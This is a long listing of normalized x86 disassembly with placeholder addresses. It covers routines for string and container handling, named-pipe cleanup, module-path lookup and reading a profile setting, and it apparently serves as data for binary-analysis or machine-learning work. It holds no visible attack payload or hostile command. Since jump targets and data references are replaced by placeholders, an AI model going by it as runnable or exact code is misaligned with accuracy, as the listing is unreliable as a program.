cmp eax edi
je r-xdata
push eax
call esi
mov [ rw-data ] edi
pop edi
pop esi
retn
push eax
call esi
mov [ rw-data ] edi
sub_407520
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call [ DisconnectNamedPipe@IAT ]
mov eax [ rw-data ]
push eax
call esi
mov [ rw-data ] 0x0
pop esi
retn
push eax
call esi
mov [ rw-data ] 0x0
sub_407570
push 0xffffffff
push sub_420bfd
mov eax [ fs : 0x0 ]
push eax
mov eax 0x1224
call sub_41c2a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1220 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1238 ]
mov [ fs : 0x0 ] eax
push 0x382
xor ebp ebp
push ebp
push rw-data
call sub_414890
add esp 0xc
push 0xfff
lea eax [ esp + 0x239 ]
push ebp
push eax
mov [ esp + 0x240 ] 0x0
call sub_414890
add esp 0xc
lea ecx [ esp + 0x20 ]
push ecx
call sub_409200
push 0x103
lea edx [ esp + 0x131 ]
push ebp
mov [ esp + 0x1248 ] ebp
push edx
mov [ esp + 0x138 ] 0x0
call sub_414890
add esp 0xc
push 0x104
lea eax [ esp + 0x130 ]
push eax
push ebp
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0x234 ]
push ecx
lea edx [ esp + 0x130 ]
push edx
call sub_40c070
test eax eax
jne r-xdata
mov ecx [ esp + 0x38 ]
mov edx [ ecx + 0x4 ]
push edx
lea ecx [ esp + 0x24 ]
call sub_409280
mov eax [ esp + 0x38 ]
mov [ eax + 0x4 ] eax
mov eax [ esp + 0x38 ]
mov [ esp + 0x3c ] ebp
mov [ eax ] eax
mov eax [ esp + 0x38 ]
mov [ eax + 0x8 ] eax
lea esi [ esp + 0x234 ]
mov ebx 0xf
mov [ esp + 0x18 ] esi
mov [ esp + 0x10c ] ebx
mov [ esp + 0x108 ] ebp
mov [ esp + 0xf8 ] 0x0
mov [ esp + 0x1240 ] 0x2
mov [ esp + 0x14 ] 0x3a
jmp r-xdata
lea esi [ esp + 0x20 ]
mov [ esp + 0x1240 ] 0x1
call sub_409590
mov eax [ esp + 0x20 ]
push eax
call sub_40f2fb
add esp 0x4
xor eax eax
jmp r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
mov ecx [ esp + 0x1238 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x1220 ]
xor ecx esp
call sub_40e1e0
add esp 0x1230
retn
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ esp + 0xfc ]
call sub_409850
push 0x1
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0xfc ]
push ecx
call sub_408d90
mov edi eax
cmp edi 0xffffffff
je r-xdata
cmp [ esp + 0x108 ] ebp
jbe r-xdata
push edi
xor ecx ecx
lea esi [ esp + 0x114 ]
lea edx [ esp + 0xf8 ]
call sub_408420
push 0xffffffff
lea ecx [ edi + 0x1 ]
lea esi [ esp + 0xdc ]
lea edx [ esp + 0xf8 ]
mov [ esp + 0x1244 ] 0x3
call sub_408420
lea ecx [ esp + 0x110 ]
lea eax [ esp + 0x20 ]
mov [ esp + 0x1240 ] 0x4
call sub_40a4b0
mov ebx [ esp + 0x20 ]
mov edi [ esp + 0x38 ]
mov esi eax
mov [ esp + 0x84 ] esi
mov [ esp + 0x80 ] ebx
cmp ebx ebp
jne r-xdata
mov esi [ esp + 0x18 ]
add esi 0x200
lea edx [ esp + 0x1234 ]
mov [ esp + 0x18 ] esi
cmp esi edx
jb r-xdata
push ebp
push r--data
lea ecx [ esp + 0xe0 ]
mov [ esp + 0xf8 ] ebx
mov [ esp + 0xf4 ] ebp
mov [ esp + 0xe4 ] 0x0
call sub_409850
lea edx [ esp + 0xd8 ]
push edx
lea eax [ esp + 0xf8 ]
push eax
lea ecx [ esp + 0x90 ]
push ecx
mov [ esp + 0x124c ] 0x7
call sub_4089e0
lea edx [ esp + 0x48 ]
push edx
mov edi eax
mov [ esp + 0x1244 ] 0x8
call sub_40ad30
lea eax [ esp + 0x48 ]
push eax
lea ecx [ esp + 0xd0 ]
push ecx
lea edx [ esp + 0x28 ]
push edx
mov [ esp + 0x124c ] 0x9
call sub_408760
mov esi 0x10
cmp [ esp + 0x7c ] esi
jb r-xdata
cmp esi edi
je r-xdata
call sub_40ee1a
mov ebx [ esp + 0x20 ]
mov ebx 0xf
xor ebp ebp
push 0x3
push r--data
lea ecx [ esp + 0xe0 ]
mov [ esp + 0xf8 ] 0xf
mov [ esp + 0xf4 ] 0x0
mov [ esp + 0xe4 ] 0x0
call sub_409850
lea eax [ esp + 0xd8 ]
push eax
lea ecx [ esp + 0x44 ]
push ecx
lea esi [ esp + 0x28 ]
mov [ esp + 0x1248 ] 0xa
call sub_408930
mov edi [ eax ]
mov esi [ eax + 0x4 ]
mov ebp [ esp + 0x38 ]
test edi edi
je r-xdata
mov [ esp + 0x7c ] ebx
mov [ esp + 0x78 ] ebp
mov [ esp + 0x68 ] 0x0
cmp [ esp + 0x60 ] esi
jb r-xdata
mov eax [ esp + 0x68 ]
push eax
call sub_40f2fb
add esp 0x4
mov edx [ esp + 0x38 ]
mov [ esp + 0x44 ] edx
mov [ esp + 0x40 ] ebx
lea eax [ esp + 0x40 ]
cmp [ esi + 0x24 ] 0x10
mov edi [ esi + 0x20 ]
jb r-xdata
call sub_40ee1a
cmp edi [ esp + 0x20 ]
je r-xdata
mov [ esp + 0x60 ] ebx
mov [ esp + 0x5c ] ebp
mov [ esp + 0x4c ] 0x0
cmp [ esp + 0xbc ] esi
jb r-xdata
mov ecx [ esp + 0x4c ]
push ecx
call sub_40f2fb
add esp 0x4
call sub_40ee1a
cmp esi ebx
je r-xdata
add esi 0x10
mov esi [ esi + 0x10 ]
jmp r-xdata
test bl bl
je r-xdata
mov edx [ esp + 0xdc ]
push edx
call sub_40f2fb
add esp 0x4
cmp esi ebp
sete bl
mov [ esp + 0x1240 ] 0x2
cmp [ esp + 0xf0 ] 0x10
jb r-xdata
mov [ esp + 0xbc ] ebx
mov [ esp + 0xb8 ] ebp
mov [ esp + 0xa8 ] 0x0
cmp [ esp + 0xa0 ] esi
jb r-xdata
mov edx [ esp + 0xa8 ]
push edx
call sub_40f2fb
add esp 0x4
lea ecx [ esp + 0xd8 ]
push ecx
lea edx [ esp + 0x114 ]
push edx
lea eax [ esp + 0x90 ]
push eax
call sub_4089e0
lea ecx [ esp + 0x48 ]
push ecx
mov edi eax
mov [ esp + 0x1244 ] 0x5
call sub_40ad30
lea edx [ esp + 0x48 ]
push edx
lea eax [ esp + 0xc4 ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
mov [ esp + 0x124c ] 0x6
call sub_408760
mov esi 0x10
cmp [ esp + 0x7c ] esi
jb r-xdata
test esi esi
jne r-xdata
cmp edi ebp
je r-xdata
cmp [ esp + 0x128 ] 0x10
mov edx [ esp + 0x114 ]
jae r-xdata
mov eax edi
mov ebp [ esp + 0x124 ]
mov eax ebp
cmp ebp edi
jb r-xdata
test edi edi
jne r-xdata
cmp [ esp + 0x10c ] 0x10
jb r-xdata
mov [ esp + 0x1240 ] 0x2
cmp [ esp + 0xf0 ] esi
jb r-xdata
mov eax [ esp + 0x8c ]
push eax
call sub_40f2fb
add esp 0x4
xor edi edi
mov ebx 0xf
mov [ esp + 0x7c ] ebx
mov [ esp + 0x78 ] edi
mov [ esp + 0x68 ] 0x0
cmp [ esp + 0x60 ] esi
jb r-xdata
mov edx [ esp + 0x68 ]
push edx
call sub_40f2fb
add esp 0x4
mov esi [ esi ]
jmp r-xdata
call sub_40ee1a
mov ecx esi
call sub_401050
test eax eax
jne r-xdata
lea edx [ esp + 0x114 ]
mov eax [ edi ]
jmp r-xdata
call sub_40ee1a
xor eax eax
mov [ esp + 0x10c ] 0xf
mov [ esp + 0x108 ] 0x0
mov [ esp + 0xf8 ] 0x0
mov eax [ esp + 0xf8 ]
push eax
call sub_40f2fb
add esp 0x4
mov ecx [ esp + 0xdc ]
mov [ esp + 0x60 ] ebx
mov [ esp + 0x5c ] edi
mov [ esp + 0x4c ] 0x0
cmp [ esp + 0xbc ] esi
jb r-xdata
mov eax [ esp + 0x4c ]
push eax
call sub_40f2fb
add esp 0x4
cmp edi [ esi + 0x18 ]
jne r-xdata
push 0xffffffff
push 0x0
lea eax [ esp + 0xe0 ]
lea ecx [ edi + 0x28 ]
push eax
call sub_408b10
mov ebx 0xf
lea esi [ ebx + 0x1 ]
xor edi edi
jmp r-xdata
call sub_40ee1a
jl r-xdata
cmp ebp edi
jb r-xdata
cmp esi [ eax + 0x18 ]
jne r-xdata
cmp [ esi + 0x40 ] 0x10
jb r-xdata
call sub_40ee1a
mov [ esp + 0xbc ] ebx
mov [ esp + 0xb8 ] edi
mov [ esp + 0xa8 ] 0x0
cmp [ esp + 0xa0 ] esi
jb r-xdata
mov ecx [ esp + 0xa8 ]
push ecx
call sub_40f2fb
add esp 0x4
cmp [ esp + 0xf0 ] esi
jb r-xdata
lea eax [ esp + 0x80 ]
jmp r-xdata
cmp ebp edi
setne al
test eax eax
lea eax [ esi + 0x2c ]
mov eax [ esi + 0x2c ]
jmp r-xdata
mov edx [ esp + 0x8c ]
push edx
call sub_40f2fb
add esp 0x4
mov [ esp + 0x1240 ] 0x2
mov [ esp + 0xf0 ] ebx
mov [ esp + 0xec ] edi
mov [ esp + 0xdc ] 0x0
cmp [ esp + 0x128 ] esi
jb r-xdata
mov eax [ esp + 0xdc ]
push eax
call sub_40f2fb
add esp 0x4
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ebp [ esp + 0x38 ]
test esi esi
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov ebp eax
test edi edi
jne r-xdata
lea edx [ eax + 0x1 ]
mov ecx [ esp + 0x114 ]
jmp r-xdata
mov edi [ edi ]
jmp r-xdata
call sub_40ee1a
push ecx
call sub_40f2fb
add esp 0x4
cmp esi [ edi + 0x18 ]
jne r-xdata
cmp [ esi + 0x40 ] 0x10
jb r-xdata
call sub_40ee1a
add esi 0x2c
mov esi [ esi + 0x2c ]
jmp r-xdata
call sub_40ee1a
cmp esi [ esp + 0x20 ]
je r-xdata
push ebp
push esi
push rw-data
call sub_4158c0
add esp 0xc
push 0x3
push r--data
lea ecx [ esp + 0xe0 ]
mov [ esp + 0xf8 ] 0xf
mov [ esp + 0xf4 ] 0x0
mov [ esp + 0xe4 ] 0x0
call sub_409850
lea edx [ esp + 0xd8 ]
push edx
lea eax [ esp + 0x44 ]
push eax
lea esi [ esp + 0x28 ]
mov [ esp + 0x1248 ] 0xb
call sub_408930
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ebp [ esp + 0x38 ]
test esi esi
je r-xdata
test bl bl
je r-xdata
mov ecx [ esp + 0xdc ]
push ecx
call sub_40f2fb
add esp 0x4
cmp edi ebp
sete bl
mov [ esp + 0x1240 ] 0x2
cmp [ esp + 0xf0 ] 0x10
jb r-xdata
test esi esi
jne r-xdata
cmp [ esp + 0x10c ] 0x10
jb r-xdata
mov eax [ esi ]
jmp r-xdata
call sub_40ee1a
xor eax eax
lea eax [ esp + 0x20 ]
push eax
mov [ esp + 0x110 ] 0xf
mov [ esp + 0x10c ] 0x0
mov [ esp + 0xfc ] 0x0
mov [ esp + 0x1244 ] 0xffffffff
call sub_4080e0
xor eax eax
jmp r-xdata
mov edx [ esp + 0xf8 ]
push edx
call sub_40f2fb
add esp 0x4
cmp edi [ eax + 0x18 ]
jne r-xdata
cmp [ edi + 0x40 ] 0x10
jb r-xdata
call sub_40ee1a
lea eax [ edi + 0x2c ]
mov eax [ edi + 0x2c ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov ebx eax
test esi esi
jne r-xdata
lea edx [ eax + 0x1 ]
mov esi [ esi ]
jmp r-xdata
call sub_40ee1a
cmp edi [ esi + 0x18 ]
jne r-xdata
cmp [ edi + 0x40 ] 0x10
jb r-xdata
call sub_40ee1a
add edi 0x2c
mov edi [ edi + 0x2c ]
jmp r-xdata
call sub_40ee1a
cmp ecx [ esp + 0x20 ]
je r-xdata
push ebx
push edi
push rw-data
call sub_4158c0
add esp 0xc
push r--data
lea ecx [ esp + 0xdc ]
call sub_408300
lea ecx [ esp + 0xd8 ]
push ecx
lea edx [ esp + 0x44 ]
push edx
lea esi [ esp + 0x28 ]
mov [ esp + 0x1248 ] 0xc
call sub_408930
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
mov edi [ esp + 0x38 ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] esi
test ecx ecx
je r-xdata
test bl bl
je r-xdata
mov eax [ esp + 0xdc ]
push eax
call sub_40f2fb
add esp 0x4
cmp esi edi
mov ebp 0x10
sete bl
mov [ esp + 0x1240 ] 0x2
cmp [ esp + 0xf0 ] ebp
jb r-xdata
lea esi [ esp + 0x18 ]
call sub_4089b0
add eax 0x1c
cmp [ eax + 0x18 ] ebp
jb r-xdata
lea ecx [ esp + 0xf4 ]
call sub_408370
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x1244 ] 0xffffffff
call sub_4080e0
xor eax eax
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea esi [ esp + 0x18 ]
mov edi eax
call sub_4089b0
add eax 0x1c
cmp [ eax + 0x18 ] ebp
jb r-xdata
lea edx [ eax + 0x1 ]
nop
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
call sub_40ee1a
cmp ecx [ esp + 0x20 ]
je r-xdata
push edi
push eax
push rw-data
call sub_4158c0
add esp 0xc
push r--data
lea ecx [ esp + 0xdc ]
call sub_408300
lea edx [ esp + 0xd8 ]
push edx
lea eax [ esp + 0x44 ]
push eax
lea esi [ esp + 0x28 ]
mov [ esp + 0x1248 ] 0xd
call sub_408930
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
mov edi [ esp + 0x38 ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] esi
test ecx ecx
je r-xdata
push r--data
lea ecx [ esp + 0xdc ]
call sub_408300
lea ecx [ esp + 0xd8 ]
push ecx
lea edx [ esp + 0x44 ]
push edx
lea esi [ esp + 0x28 ]
mov [ esp + 0x1248 ] 0xe
call sub_408930
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
mov edi [ esp + 0x38 ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] esi
test ecx ecx
je r-xdata
lea esi [ esp + 0x18 ]
call sub_4089b0
add eax 0x1c
mov ebx 0x10
cmp [ eax + 0x18 ] ebx
jb r-xdata
cmp esi edi
lea ecx [ esp + 0xd8 ]
setne bl
mov [ esp + 0x1240 ] 0x2
call sub_408370
test bl bl
je r-xdata
call sub_40ee1a
cmp ecx [ esp + 0x20 ]
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push r--data
lea ecx [ esp + 0xdc ]
call sub_408300
lea eax [ esp + 0xd8 ]
push eax
lea ecx [ esp + 0x44 ]
push ecx
lea esi [ esp + 0x28 ]
mov [ esp + 0x1248 ] 0xf
call sub_408930
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
mov edi [ esp + 0x38 ]
test ecx ecx
je r-xdata
lea esi [ esp + 0x18 ]
call sub_4089b0
add eax 0x1c
mov ebx 0x10
cmp [ eax + 0x18 ] ebx
jb r-xdata
cmp esi edi
lea ecx [ esp + 0xd8 ]
setne bl
mov [ esp + 0x1240 ] 0x2
call sub_408370
test bl bl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea esi [ esp + 0x18 ]
mov edi eax
call sub_4089b0
add eax 0x1c
cmp [ eax + 0x18 ] ebx
jb r-xdata
lea edx [ eax + 0x1 ]
call sub_40ee1a
cmp ecx [ esp + 0x20 ]
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push r--data
lea ecx [ esp + 0xdc ]
call sub_408300
lea edx [ esp + 0xd8 ]
push edx
lea eax [ esp + 0x44 ]
push eax
lea esi [ esp + 0x28 ]
mov [ esp + 0x1248 ] 0x10
call sub_408930
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
mov edi [ esp + 0x38 ]
test ecx ecx
je r-xdata
mov [ rw-data ] 0x1
cmp esi edi
lea ecx [ esp + 0xd8 ]
setne bl
mov [ esp + 0x1240 ] 0x2
call sub_408370
test bl bl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea esi [ esp + 0x18 ]
mov edi eax
call sub_4089b0
add eax 0x1c
cmp [ eax + 0x18 ] ebx
jb r-xdata
lea edx [ eax + 0x1 ]
push edi
push eax
push rw-data
call sub_4158c0
add esp 0xc
call sub_40ee1a
cmp ecx [ esp + 0x20 ]
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea ecx [ esp + 0xf4 ]
call sub_408370
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x1244 ] 0xffffffff
call sub_4080e0
mov eax 0x1
mov [ rw-data ] 0x1
cmp esi edi
lea ecx [ esp + 0xd8 ]
setne bl
call sub_408370
test bl bl
je r-xdata
push edi
push eax
push rw-data
call sub_4158c0
add esp 0xc
sub_4080e0
push 0xffffffff
push sub_420b18
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x1c ]
mov [ esp + 0x14 ] 0x0
call sub_409590
mov eax [ esi ]
push eax
call sub_40f2fb
add esp 0x4
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn 0x4
sub_408140
cmp [ esi + 0x34 ] 0x10
jb r-xdata
push ebx
xor ebx ebx
mov [ esi + 0x34 ] 0xf
mov [ esi + 0x30 ] ebx
mov [ esi + 0x20 ] bl
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax [ esi + 0x20 ]
push eax
call sub_40f2fb
add esp 0x4
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x4 ] bl
pop ebx
retn
mov ecx [ esi + 0x4 ]
push ecx
call sub_40f2fb
add esp 0x4
sub_408190
sub esp 0x298
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x290 ] eax
push ebx
push esi
push edi
xor ebx ebx
push 0x7f
lea eax [ esp + 0x1d ]
push ebx
push eax
mov [ esp + 0x24 ] bl
call sub_414890
push 0xff
lea ecx [ esp + 0x1a9 ]
push ebx
push ecx
mov [ esp + 0x1b0 ] bl
call sub_414890
push 0xff
lea edx [ esp + 0xb5 ]
push ebx
push edx
mov [ esp + 0xbc ] bl
call sub_414890
add esp 0x24
push 0xff
lea eax [ esp + 0x19c ]
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
push ebx
push ebx
lea ecx [ esp + 0xa0 ]
push ecx
lea edx [ esp + 0x1a4 ]
push ebx
push edx
call sub_40fb82
lea eax [ esp + 0xac ]
add esp 0x14
dec eax
mov cl [ eax + 0x1 ]
inc eax
cmp cl bl
jne r-xdata
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
mov cx [ r--data ]
mov [ eax + 0x4 ] edx
lea edx [ esp + 0x98 ]
push edx
push 0x80
mov [ eax + 0x8 ] cx
lea eax [ esp + 0x20 ]
push eax
push r--data
push r--data
push r--data
call [ GetPrivateProfileStringA@IAT ]
push 0x7
lea ecx [ esp + 0x1c ]
push r--data
push ecx
call sub_40e771
add esp 0xc
test eax eax
jne r-xdata
lea edx [ esp + 0x18 ]
push edx
call sub_40e9ad
cdq
mov esi edx
add esp 0x4
mov edi eax
or eax esi
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x290 ]
xor ecx esp
call sub_40e1e0
add esp 0x298
retn
lea ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
call sub_40fcc1
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
add esp 0x4
cmp edx esi
jl r-xdata
mov eax edi
pop edi
sub eax ecx
mov ecx [ esp + 0x298 ]
pop esi
pop ebx
xor ecx esp
call sub_40e1e0
add esp 0x298
retn
jg r-xdata
cmp ecx edi
jae r-xdata
sub_408300
mov edx [ esp + 0x4 ]
push esi
mov esi ecx
mov eax edx
push edi
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] 0x0
lea edi [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_409850
pop edi
mov eax esi
pop esi
retn 0x4
sub_408340
push esi
xor eax eax
mov esi ecx
push 0xffffffff
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xf
push eax
mov [ esi + 0x4 ] al
mov eax [ esp + 0x10 ]
push eax
call sub_408b10
mov eax esi
pop esi
retn 0x4
sub_408370
push esi
mov esi ecx
cmp [ esi + 0x18 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] eax
mov [ esi + 0x4 ] al
pop esi
retn
mov eax [ esi + 0x4 ]
push eax
call sub_40f2fb
add esp 0x4
sub_4083a0
sub esp 0x18
push ebx
push esi
push edi
lea edi [ esp + 0x10 ]
call sub_408d20
mov edx [ rw-data ]
mov edi [ eax ]
mov ebx [ eax + 0x4 ]
mov eax [ rw-data ]
cmp edx 0x10
jb r-xdata
mov esi rw-data
jmp r-xdata
mov esi eax
test eax eax
je r-xdata
mov ecx eax
cmp edx 0x10
jae r-xdata
call sub_40ee1a
cmp ecx esi
ja r-xdata
mov ecx rw-data
cmp edx 0x10
jae r-xdata
mov ecx [ rw-data ]
add eax ecx
cmp esi eax
jbe r-xdata
mov eax rw-data
push ebx
push edi
push esi
mov eax rw-data
push eax
lea edx [ esp + 0x28 ]
push edx
call sub_408bf0
pop edi
pop esi
pop ebx
add esp 0x18
retn
sub_408420
push ecx
xor eax eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xf
mov [ esp ] eax
mov [ esi + 0x4 ] al
mov eax [ esp + 0x8 ]
push eax
push ecx
push edx
mov ecx esi
call sub_408b10
mov eax esi
pop ecx
retn 0x4
sub_408450
push 0xffffffff
push sub_420af5
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
push 0x4
call sub_40fd2d
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
xor eax eax
mov [ eax ] rw-data
jmp r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] ecx
mov [ rw-data ] ecx
mov eax rw-data
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn
sub_4084c0
sub esp 0xc
push esi
push edi
mov edi [ rw-data ]
test edi edi
jne r-xdata
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov ecx edx
shr ecx 0x1f
add ecx edx
xor ecx ecx
jmp r-xdata
cmp edi esi
jbe r-xdata
mov [ esp + 0x8 ] 0x0
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x8 ]
push ecx
push edx
push ebx
push esi
mov ecx 0x1
call sub_40af80
add esp 0x10
add esi 0x18
mov [ rw-data ] esi
pop edi
pop esi
add esp 0xc
retn
mov esi [ rw-data ]
mov edx esi
sub edx edi
mov eax 0x2aaaaaab
imul edx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ecx
jae r-xdata
mov eax [ rw-data ]
push esi
push eax
push ebx
lea eax [ esp + 0x14 ]
push eax
call sub_408e60
pop edi
pop esi
add esp 0xc
retn
call sub_40ee1a
sub_408560
push ebp
mov ebp esp
push 0xffffffff
push sub_420ac8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov esi [ ebp + 0x8 ]
push 0x4
call sub_40fd2d
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp edi 0x9249249
jbe r-xdata
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebx + 0x10 ]
sub ecx [ ebx + 0xc ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
mov eax 0x0
shr edi 0x1f
add edi edx
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
je r-xdata
mov ecx edi
call sub_409f50
lea ecx [ edi * 8 ]
sub ecx edi
lea edx [ eax + ecx * 4 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] edx
mov [ ebp - 0x4 ] 0x1
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x18 ] eax
cmp [ ebx + 0xc ] eax
jbe r-xdata
call sub_40a2e0
mov edi [ ebx + 0xc ]
cmp edi [ ebx + 0x10 ]
jbe r-xdata
call sub_40ee1a
mov edx [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov [ ebp - 0x14 ] 0x0
mov ecx [ ebp - 0x14 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx edi
call sub_40b3c0
add esp 0x10
mov [ esi + 0x10 ] eax
call sub_40ee1a
sub_408670
push ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi ]
push eax
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
call sub_40f2fb
add esp 0x8
retn
mov ecx [ esp ]
push edi
mov edi [ esi + 0x10 ]
push ecx
call sub_40b130
mov edx [ esi + 0xc ]
push edx
call sub_40f2fb
add esp 0x8
pop edi
sub_4086c0
sub esp 0xc
push ebp
mov ebp [ ebx + 0xc ]
push esi
push edi
test ebp ebp
jne r-xdata
mov ecx [ ebx + 0x14 ]
sub ecx ebp
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
xor esi esi
jmp r-xdata
cmp ebp edi
jbe r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x1c ]
mov [ esp + 0x10 ] 0x0
mov ecx [ esp + 0x10 ]
push ecx
push edx
push eax
push edi
mov ecx 0x1
call sub_40b010
add esp 0x10
add edi 0x1c
mov [ ebx + 0x10 ] edi
pop edi
pop esi
pop ebp
add esp 0xc
retn 0x4
mov edi [ ebx + 0x10 ]
mov ecx edi
sub ecx ebp
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax esi
jae r-xdata
mov eax [ ebx ]
mov ecx [ esp + 0x1c ]
push edi
push eax
push ecx
lea edx [ esp + 0x1c ]
push edx
mov eax ebx
call sub_4090b0
pop edi
pop esi
pop ebp
add esp 0xc
retn 0x4
call sub_40ee1a
sub_408760
sub esp 0x18
push ebx
mov ebx [ esp + 0x24 ]
push ebp
mov ebp [ esp + 0x24 ]
mov eax [ ebp + 0x18 ]
push esi
push edi
mov edi [ eax + 0x4 ]
cmp [ edi + 0x45 ] 0x0
mov ecx eax
mov al 0x1
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] al
jne r-xdata
mov esi [ ebp ]
mov edi ecx
mov [ esp + 0x24 ] edi
mov [ esp + 0x20 ] esi
test al al
je r-xdata
mov esi [ esp + 0x34 ]
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x18 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x20 ] ecx
jmp r-xdata
mov eax [ esp + 0x34 ]
lea edx [ edi + 0xc ]
call sub_4095d0
test al al
je r-xdata
mov eax [ ebp + 0x18 ]
mov edi [ eax ]
test esi esi
je r-xdata
cmp [ edi + 0x24 ] 0x10
mov edx [ edi + 0x20 ]
mov [ esp + 0x10 ] edi
jb r-xdata
mov [ ebx + 0x4 ] edi
pop edi
mov [ ebx ] esi
pop esi
pop ebp
mov [ ebx + 0x8 ] 0x0
mov eax ebx
pop ebx
add esp 0x18
retn 0xc
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x28 ]
push edx
jmp r-xdata
call sub_40ee1a
mov ecx [ esp + 0x10 ]
cmp esi esi
je r-xdata
lea ecx [ edi + 0x10 ]
mov ecx [ edi + 0x10 ]
jmp r-xdata
push ebp
call sub_409300
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebx ] ecx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] 0x1
mov eax ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn 0xc
